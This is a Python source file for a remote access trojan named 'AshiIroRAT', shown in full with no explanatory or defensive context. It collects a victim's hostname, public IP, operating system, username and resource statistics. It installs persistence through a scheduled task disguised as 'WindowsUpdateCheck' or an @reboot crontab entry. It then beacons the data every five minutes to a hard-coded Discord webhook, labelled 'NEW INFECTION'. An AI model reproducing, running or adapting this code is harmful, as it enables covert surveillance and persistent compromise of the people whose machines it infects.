import socket, threading, time, os, subprocess, requests, psutil, platform, base64, zlib, json
from datetime import datetime
import uuid

WEBHOOK = "https://discord.com/api/webhooks/1463725220337684491/AO554py2QlCE8EixDQsUYU1v2EURivEw_yoSsQIFrY6mnDq22TWq5ZLnIdjTREA1uNiG"
SESSION_ID = "074788bf-4411-451a-ad48-e2dc539ef1c9"

class AshiIroRAT:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.session_id = SESSION_ID
        self.exe_path = os.path.abspath(__file__)
        
    def system_info(self):
        try:
            return {
                "hostname": self.hostname,
                "session": self.session_id,
                "ip": requests.get('https://api.ipify.org?format=json', timeout=10).json().get('ip', 'unknown'),
                "os": platform.platform(),
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent,
                "disk": psutil.disk_usage('C:\\').percent if platform.system() == 'Windows' else psutil.disk_usage('/').percent,
                "processes": len(psutil.pids()),
                "user": os.getenv('USERNAME') or os.getenv('USER'),
                "timestamp": datetime.now().isoformat()
            }
        except:
            return {"error": "info collection failed"}
    
    def persistence(self):
        try:
            if platform.system() == 'Windows':
                subprocess.run(f'schtasks /create /tn "WindowsUpdateCheck" /tr "python \"{self.exe_path}\"" /sc onlogon /rl highest /f', 
                             shell=True, capture_output=True)
            else:
                subprocess.run(f'echo "@reboot python3 {self.exe_path}" | crontab -', shell=True)
        except: pass
    
    def exfiltrate(self):
        data = self.system_info()
        try:
            requests.post(WEBHOOK, json={
                "embeds": [{
                    "title": f" NEW INFECTION: {self.hostname}",
                    "description": f"```json\n{json.dumps(data, indent=2)}\n```",
                    "color": 16711680,
                    "timestamp": datetime.now().isoformat()
                }]
            })
        except: pass

    def beacon(self):
        self.persistence()
        self.exfiltrate()
        while True:
            try:
                self.exfiltrate()
                time.sleep(300)
            except:
                time.sleep(600)

if __name__ == "__main__":
    rat = AshiIroRAT()
    rat.beacon()
